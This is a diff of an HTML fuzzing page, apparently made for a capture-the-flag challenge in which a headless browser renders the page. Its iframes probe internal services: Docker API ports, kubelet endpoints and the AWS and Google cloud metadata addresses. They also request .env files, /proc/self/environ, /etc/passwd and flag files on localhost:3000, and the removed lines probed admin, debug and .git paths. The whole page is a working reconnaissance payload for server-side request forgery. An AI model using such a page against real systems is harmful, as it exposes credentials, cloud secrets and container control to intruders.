@@ -2,122 +2,89 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Port 3000 Fuzz</title>
+    <title>Docker & Config Fuzz</title>
     <style>
-        body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 12px; }
-        .box { border: 1px solid #0f0; margin: 6px 0; padding: 6px; }
-        iframe { width: 100%; height: 160px; border: 2px solid #f00; background: #000; }
-        h2 { color: #ff0; margin-top: 18px; }
+        body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:12px; font-size:13px; }
+        .box { border:1px solid #0f0; margin:6px 0; padding:6px; }
+        iframe { width:100%; height:150px; border:2px solid #f00; background:#000; }
+        h2 { color:#ff0; margin-top:16px; }
     </style>
 </head>
 <body>
-    <h1>Port 3000 Endpoint Fuzz</h1>
+    <h1>Docker / Container / Config Fuzz</h1>
     <p>Time: <script>document.write(new Date().toISOString())</script></p>
 
-    <!-- ===== Core / API ===== -->
-    <h2>Core & API</h2>
-    <div class="box">/ <iframe src="http://127.0.0.1:3000/"></iframe></div>
-    <div class="box">/api <iframe src="http://127.0.0.1:3000/api"></iframe></div>
-    <div class="box">/api/ <iframe src="http://127.0.0.1:3000/api/"></iframe></div>
-    <div class="box">/api/review <iframe src="http://127.0.0.1:3000/api/review"></iframe></div>
-    <div class="box">/api/reviews <iframe src="http://127.0.0.1:3000/api/reviews"></iframe></div>
-    <div class="box">/api/jobs <iframe src="http://127.0.0.1:3000/api/jobs"></iframe></div>
-    <div class="box">/api/status <iframe src="http://127.0.0.1:3000/api/status"></iframe></div>
-    <div class="box">/api/health <iframe src="http://127.0.0.1:3000/api/health"></iframe></div>
-    <div class="box">/api/flag <iframe src="http://127.0.0.1:3000/api/flag"></iframe></div>
-    <div class="box">/api/admin <iframe src="http://127.0.0.1:3000/api/admin"></iframe></div>
-    <div class="box">/api/config <iframe src="http://127.0.0.1:3000/api/config"></iframe></div>
-    <div class="box">/api/debug <iframe src="http://127.0.0.1:3000/api/debug"></iframe></div>
-    <div class="box">/api/internal <iframe src="http://127.0.0.1:3000/api/internal"></iframe></div>
-    <div class="box">/api/v1 <iframe src="http://127.0.0.1:3000/api/v1"></iframe></div>
-    <div class="box">/api/v1/review <iframe src="http://127.0.0.1:3000/api/v1/review"></iframe></div>
+    <!-- ===== Docker socket & API (nếu có proxy HTTP) ===== -->
+    <h2>Docker API / Socket proxies</h2>
+    <div class="box">:2375/version <iframe src="http://127.0.0.1:2375/version"></iframe></div>
+    <div class="box">:2375/info <iframe src="http://127.0.0.1:2375/info"></iframe></div>
+    <div class="box">:2375/containers/json <iframe src="http://127.0.0.1:2375/containers/json"></iframe></div>
+    <div class="box">:2376/version <iframe src="http://127.0.0.1:2376/version"></iframe></div>
+    <div class="box">:2376/info <iframe src="http://127.0.0.1:2376/info"></iframe></div>
+    <div class="box">:4243/version <iframe src="http://127.0.0.1:4243/version"></iframe></div>
+    <div class="box">:9323/metrics <iframe src="http://127.0.0.1:9323/metrics"></iframe></div>
 
-    <!-- ===== Health / Status ===== -->
-    <h2>Health & Status</h2>
-    <div class="box">/health <iframe src="http://127.0.0.1:3000/health"></iframe></div>
-    <div class="box">/healthz <iframe src="http://127.0.0.1:3000/healthz"></iframe></div>
-    <div class="box">/ready <iframe src="http://127.0.0.1:3000/ready"></iframe></div>
-    <div class="box">/readyz <iframe src="http://127.0.0.1:3000/readyz"></iframe></div>
-    <div class="box">/live <iframe src="http://127.0.0.1:3000/live"></iframe></div>
-    <div class="box">/livez <iframe src="http://127.0.0.1:3000/livez"></iframe></div>
-    <div class="box">/status <iframe src="http://127.0.0.1:3000/status"></iframe></div>
-    <div class="box">/ping <iframe src="http://127.0.0.1:3000/ping"></iframe></div>
-    <div class="box">/version <iframe src="http://127.0.0.1:3000/version"></iframe></div>
-    <div class="box">/info <iframe src="http://127.0.0.1:3000/info"></iframe></div>
-    <div class="box">/metrics <iframe src="http://127.0.0.1:3000/metrics"></iframe></div>
-    <div class="box">/prometheus <iframe src="http://127.0.0.1:3000/prometheus"></iframe></div>
+    <!-- ===== Kubernetes / cloud metadata ===== -->
+    <h2>K8s / Cloud metadata</h2>
+    <div class="box">:10250/pods <iframe src="http://127.0.0.1:10250/pods"></iframe></div>
+    <div class="box">:10255/pods <iframe src="http://127.0.0.1:10255/pods"></iframe></div>
+    <div class="box">:4149/metrics <iframe src="http://127.0.0.1:4149/metrics"></iframe></div>
+    <div class="box">169.254.169.254 <iframe src="http://169.254.169.254/latest/meta-data/"></iframe></div>
+    <div class="box">169.254.169.254/latest/user-data <iframe src="http://169.254.169.254/latest/user-data"></iframe></div>
+    <div class="box">metadata.google.internal <iframe src="http://metadata.google.internal/computeMetadata/v1/"></iframe></div>
 
-    <!-- ===== Admin / Debug / Flag ===== -->
-    <h2>Admin / Debug / Flag</h2>
-    <div class="box">/admin <iframe src="http://127.0.0.1:3000/admin"></iframe></div>
-    <div class="box">/admin/ <iframe src="http://127.0.0.1:3000/admin/"></iframe></div>
-    <div class="box">/administrator <iframe src="http://127.0.0.1:3000/administrator"></iframe></div>
-    <div class="box">/debug <iframe src="http://127.0.0.1:3000/debug"></iframe></div>
-    <div class="box">/debugger <iframe src="http://127.0.0.1:3000/debugger"></iframe></div>
-    <div class="box">/console <iframe src="http://127.0.0.1:3000/console"></iframe></div>
-    <div class="box">/flag <iframe src="http://127.0.0.1:3000/flag"></iframe></div>
-    <div class="box">/flag.txt <iframe src="http://127.0.0.1:3000/flag.txt"></iframe></div>
-    <div class="box">/flags <iframe src="http://127.0.0.1:3000/flags"></iframe></div>
-    <div class="box">/secret <iframe src="http://127.0.0.1:3000/secret"></iframe></div>
-    <div class="box">/secrets <iframe src="http://127.0.0.1:3000/secrets"></iframe></div>
-    <div class="box">/internal <iframe src="http://127.0.0.1:3000/internal"></iframe></div>
-    <div class="box">/private <iframe src="http://127.0.0.1:3000/private"></iframe></div>
-
-    <!-- ===== Config / Source ===== -->
-    <h2>Config & Source</h2>
+    <!-- ===== Common config files qua port 3000 ===== -->
+    <h2>Config files on :3000</h2>
+    <div class="box">/docker-compose.yml <iframe src="http://127.0.0.1:3000/docker-compose.yml"></iframe></div>
+    <div class="box">/docker-compose.yaml <iframe src="http://127.0.0.1:3000/docker-compose.yaml"></iframe></div>
+    <div class="box">/Dockerfile <iframe src="http://127.0.0.1:3000/Dockerfile"></iframe></div>
+    <div class="box">/.dockerignore <iframe src="http://127.0.0.1:3000/.dockerignore"></iframe></div>
+    <div class="box">/compose.yml <iframe src="http://127.0.0.1:3000/compose.yml"></iframe></div>
     <div class="box">/.env <iframe src="http://127.0.0.1:3000/.env"></iframe></div>
-    <div class="box">/env <iframe src="http://127.0.0.1:3000/env"></iframe></div>
-    <div class="box">/config <iframe src="http://127.0.0.1:3000/config"></iframe></div>
+    <div class="box">/.env.local <iframe src="http://127.0.0.1:3000/.env.local"></iframe></div>
+    <div class="box">/.env.production <iframe src="http://127.0.0.1:3000/.env.production"></iframe></div>
     <div class="box">/config.json <iframe src="http://127.0.0.1:3000/config.json"></iframe></div>
+    <div class="box">/config.yml <iframe src="http://127.0.0.1:3000/config.yml"></iframe></div>
+    <div class="box">/config.yaml <iframe src="http://127.0.0.1:3000/config.yaml"></iframe></div>
+    <div class="box">/app.json <iframe src="http://127.0.0.1:3000/app.json"></iframe></div>
     <div class="box">/package.json <iframe src="http://127.0.0.1:3000/package.json"></iframe></div>
     <div class="box">/package-lock.json <iframe src="http://127.0.0.1:3000/package-lock.json"></iframe></div>
-    <div class="box">/server.js <iframe src="http://127.0.0.1:3000/server.js"></iframe></div>
-    <div class="box">/app.js <iframe src="http://127.0.0.1:3000/app.js"></iframe></div>
-    <div class="box">/index.js <iframe src="http://127.0.0.1:3000/index.js"></iframe></div>
-    <div class="box">/main.js <iframe src="http://127.0.0.1:3000/main.js"></iframe></div>
-    <div class="box">/src <iframe src="http://127.0.0.1:3000/src"></iframe></div>
-    <div class="box">/src/index.js <iframe src="http://127.0.0.1:3000/src/index.js"></iframe></div>
+    <div class="box">/yarn.lock <iframe src="http://127.0.0.1:3000/yarn.lock"></iframe></div>
+    <div class="box">/pnpm-lock.yaml <iframe src="http://127.0.0.1:3000/pnpm-lock.yaml"></iframe></div>
+    <div class="box">/tsconfig.json <iframe src="http://127.0.0.1:3000/tsconfig.json"></iframe></div>
+    <div class="box">/next.config.js <iframe src="http://127.0.0.1:3000/next.config.js"></iframe></div>
+    <div class="box">/nuxt.config.js <iframe src="http://127.0.0.1:3000/nuxt.config.js"></iframe></div>
+    <div class="box">/vite.config.js <iframe src="http://127.0.0.1:3000/vite.config.js"></iframe></div>
+    <div class="box">/webpack.config.js <iframe src="http://127.0.0.1:3000/webpack.config.js"></iframe></div>
+    <div class="box">/puppeteer.config.js <iframe src="http://127.0.0.1:3000/puppeteer.config.js"></iframe></div>
+    <div class="box">/playwright.config.js <iframe src="http://127.0.0.1:3000/playwright.config.js"></iframe></div>
 
-    <!-- ===== Static / Common ===== -->
-    <h2>Static & Common</h2>
-    <div class="box">/static <iframe src="http://127.0.0.1:3000/static"></iframe></div>
-    <div class="box">/public <iframe src="http://127.0.0.1:3000/public"></iframe></div>
-    <div class="box">/assets <iframe src="http://127.0.0.1:3000/assets"></iframe></div>
-    <div class="box">/js <iframe src="http://127.0.0.1:3000/js"></iframe></div>
-    <div class="box">/css <iframe src="http://127.0.0.1:3000/css"></iframe></div>
-    <div class="box">/robots.txt <iframe src="http://127.0.0.1:3000/robots.txt"></iframe></div>
-    <div class="box">/sitemap.xml <iframe src="http://127.0.0.1:3000/sitemap.xml"></iframe></div>
-    <div class="box">/favicon.ico <iframe src="http://127.0.0.1:3000/favicon.ico"></iframe></div>
-    <div class="box">/.git <iframe src="http://127.0.0.1:3000/.git"></iframe></div>
-    <div class="box">/.git/HEAD <iframe src="http://127.0.0.1:3000/.git/HEAD"></iframe></div>
-    <div class="box">/.git/config <iframe src="http://127.0.0.1:3000/.git/config"></iframe></div>
-    <div class="box">/node_modules <iframe src="http://127.0.0.1:3000/node_modules"></iframe></div>
+    <!-- ===== Proc / runtime info (nếu có service proxy) ===== -->
+    <h2>Proc / Runtime (qua :3000)</h2>
+    <div class="box">/proc/self/environ <iframe src="http://127.0.0.1:3000/proc/self/environ"></iframe></div>
+    <div class="box">/proc/self/cmdline <iframe src="http://127.0.0.1:3000/proc/self/cmdline"></iframe></div>
+    <div class="box">/proc/self/cwd <iframe src="http://127.0.0.1:3000/proc/self/cwd"></iframe></div>
+    <div class="box">/proc/self/exe <iframe src="http://127.0.0.1:3000/proc/self/exe"></iframe></div>
+    <div class="box">/proc/1/environ <iframe src="http://127.0.0.1:3000/proc/1/environ"></iframe></div>
+    <div class="box">/proc/1/cmdline <iframe src="http://127.0.0.1:3000/proc/1/cmdline"></iframe></div>
+    <div class="box">/etc/passwd <iframe src="http://127.0.0.1:3000/etc/passwd"></iframe></div>
+    <div class="box">/etc/hostname <iframe src="http://127.0.0.1:3000/etc/hostname"></iframe></div>
+    <div class="box">/etc/hosts <iframe src="http://127.0.0.1:3000/etc/hosts"></iframe></div>
+    <div class="box">/etc/os-release <iframe src="http://127.0.0.1:3000/etc/os-release"></iframe></div>
+    <div class="box">/flag <iframe src="http://127.0.0.1:3000/flag"></iframe></div>
+    <div class="box">/flag.txt <iframe src="http://127.0.0.1:3000/flag.txt"></iframe></div>
+    <div class="box">/app/flag <iframe src="http://127.0.0.1:3000/app/flag"></iframe></div>
+    <div class="box">/home/flag <iframe src="http://127.0.0.1:3000/home/flag"></iframe></div>
+    <div class="box">/tmp/flag <iframe src="http://127.0.0.1:3000/tmp/flag"></iframe></div>
 
-    <!-- ===== Review related ===== -->
-    <h2>Review related</h2>
-    <div class="box">/review <iframe src="http://127.0.0.1:3000/review"></iframe></div>
-    <div class="box">/reviews <iframe src="http://127.0.0.1:3000/reviews"></iframe></div>
-    <div class="box">/snapshot <iframe src="http://127.0.0.1:3000/snapshot"></iframe></div>
-    <div class="box">/snapshots <iframe src="http://127.0.0.1:3000/snapshots"></iframe></div>
-    <div class="box">/pdf <iframe src="http://127.0.0.1:3000/pdf"></iframe></div>
-    <div class="box">/capture <iframe src="http://127.0.0.1:3000/capture"></iframe></div>
-    <div class="box">/job <iframe src="http://127.0.0.1:3000/job"></iframe></div>
-    <div class="box">/jobs <iframe src="http://127.0.0.1:3000/jobs"></iframe></div>
-    <div class="box">/queue <iframe src="http://127.0.0.1:3000/queue"></iframe></div>
-    <div class="box">/worker <iframe src="http://127.0.0.1:3000/worker"></iframe></div>
-
-    <!-- ===== Express / Node typical ===== -->
-    <h2>Express / Node typical</h2>
-    <div class="box">/express <iframe src="http://127.0.0.1:3000/express"></iframe></div>
-    <div class="box">/__debug <iframe src="http://127.0.0.1:3000/__debug"></iframe></div>
-    <div class="box">/__inspector <iframe src="http://127.0.0.1:3000/__inspector"></iframe></div>
-    <div class="box">/graphql <iframe src="http://127.0.0.1:3000/graphql"></iframe></div>
-    <div class="box">/graphiql <iframe src="http://127.0.0.1:3000/graphiql"></iframe></div>
-    <div class="box">/playground <iframe src="http://127.0.0.1:3000/playground"></iframe></div>
-    <div class="box">/swagger <iframe src="http://127.0.0.1:3000/swagger"></iframe></div>
-    <div class="box">/swagger.json <iframe src="http://127.0.0.1:3000/swagger.json"></iframe></div>
-    <div class="box">/docs <iframe src="http://127.0.0.1:3000/docs"></iframe></div>
-    <div class="box">/documentation <iframe src="http://127.0.0.1:3000/documentation"></iframe></div>
+    <!-- ===== Chrome / Puppeteer related ===== -->
+    <h2>Chrome / Puppeteer paths</h2>
+    <div class="box">/chrome <iframe src="http://127.0.0.1:3000/chrome"></iframe></div>
+    <div class="box">/chromium <iframe src="http://127.0.0.1:3000/chromium"></iframe></div>
+    <div class="box">/usr/bin/google-chrome <iframe src="http://127.0.0.1:3000/usr/bin/google-chrome"></iframe></div>
+    <div class="box">/usr/bin/chromium <iframe src="http://127.0.0.1:3000/usr/bin/chromium"></iframe></div>
+    <div class="box">/headless-shell <iframe src="http://127.0.0.1:3000/headless-shell"></iframe></div>
+    <div class="box">/opt/google/chrome <iframe src="http://127.0.0.1:3000/opt/google/chrome"></iframe></div>
 
     <h2>Done</h2>
 </body>
